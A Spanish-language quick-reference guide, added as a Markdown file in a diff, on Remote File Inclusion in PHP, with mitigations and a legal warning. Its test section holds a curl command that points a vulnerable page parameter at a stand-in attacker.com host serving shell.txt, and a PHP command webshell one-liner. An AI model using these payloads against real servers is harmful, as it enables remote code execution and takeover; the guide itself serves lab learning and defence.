@@ -1,0 +1,53 @@
+---
+title: "Remote File Inclusion (RFI) — Guía rápida"
+description: "Resumen: RFI (Remote File Inclusion) ocurre cuando una aplicación incluye archivos remotos (por URL) controlados por el atacante. En PHP esto históricamente se explotó cuando allow_url_include estaba activado y la aplica"
+category: "Imported Documentation"
+tags:
+  - documentation
+  - notebook
+  - rfi
+---
+# Remote File Inclusion (RFI) — Guía rápida
+
+Resumen: RFI (Remote File Inclusion) ocurre cuando una aplicación incluye archivos remotos (por URL) controlados por el atacante. En PHP esto históricamente se explotó cuando `allow_url_include` estaba activado y la aplicación incluía variables sin validar (ej. `include($_GET['page'])` con URL remota).
+
+Qué es y cómo funciona
+- Definición: la aplicación carga código/fichero desde una URL remota (HTTP/FTP) controlada por el atacante.
+- Condición necesaria: el servidor o la configuración del lenguaje permite incluir URLs remotas (`allow_url_include=On` en PHP) o se usa un wrapper que permite leer recursos remotos.
+- Riesgo principal: ejecución remota de código (RCE) si el archivo incluido contiene código ejecutable (p.ej. PHP).
+
+Diferencias clave entre LFI y RFI
+- LFI: incluye ficheros locales en el servidor; evitable mediante normalización de rutas y whitelists.
+- RFI: incluye ficheros remotos — más peligroso ya que permite al atacante servir su propio código y provocará ejecución remota.
+
+Detección y payloads de prueba (solo en entornos autorizados)
+- Prueba simple (si `?page=` es vulnerable):
+```bash
+curl -s -H 'Host: unika.htb' "http://10.129.95.234/?page=http://attacker.com/shell.txt"
+```
+- PHP wrapper ejemplo (si allow_url_include está ON):
+  - `http://victim/?page=http://attacker.com/shell.txt` donde `shell.txt` contiene `<?php system($_GET['cmd']); ?>`
+- Si `allow_url_include` está desactivado pero `allow_url_fopen` está ON, solo lectura remota puede ser posible (no ejecución automática).
+
+Técnicas de explotación
+- Subir un webshell a un servidor controlado por el atacante y apuntar al URL desde el parámetro vulnerable.
+- Uso de wrappers `data://` o `expect://` en configuraciones inseguras (depende de la versión de PHP y módulos habilitados).
+
+Mitigaciones
+- Desactivar `allow_url_include` y preferir `allow_url_fopen=Off` si no es necesario.
+- Validar/normalizar entradas; usar listas blancas de ficheros permitidos.
+- Ejecutar la app con mínimos privilegios y separar uploads del directorio de ejecución.
+- Aplicar WAF/IPS para bloquear llamadas a dominios remotos no esperados en parámetros de inclusión.
+
+Lectura responsable de CVE/PoC
+- Consulta la advisory del vendor primero y verifica si la versión en el objetivo está listada como afectada.
+- Si hay PoC pública, revisa condiciones (configuración, módulos habilitados) antes de intentar replicar.
+
+Advertencia legal
+- No intentes RFI contra sistemas sin autorización expresa. Usa laboratorios controlados.
+
+Referencias
+- Apache advisory: https://httpd.apache.org/security/vulnerabilities_24.html
+- NVD, CVE DB y PoCs vinculadas (buscar por CVE si procede)
+
+Archivo: `documentation/RFI.md` creado.
